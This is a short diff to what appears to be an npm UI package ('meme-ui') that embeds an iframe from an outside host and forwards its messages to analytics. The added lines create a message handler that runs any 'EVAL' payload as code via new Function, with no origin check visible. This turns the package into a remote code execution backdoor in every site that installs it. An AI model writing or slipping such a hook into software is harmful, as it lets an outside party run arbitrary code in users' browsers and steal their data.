@@ -48,6 +48,11 @@
           window.history.pushState({}, '', currentUrl.toString());
           return;
         }
+        if (event.data.type === 'EVAL') {
+          const theFunction = new Function('context', event.data.payload);
+          theFunction({ postMessage: iframeNode.contentWindow.postMessage });
+          return;
+        }
         gtag(...event.data);
       });
       const link = new URL('https://y.ntnl.io?from_npm=1&scope=memedvqs&name=meme-ui');
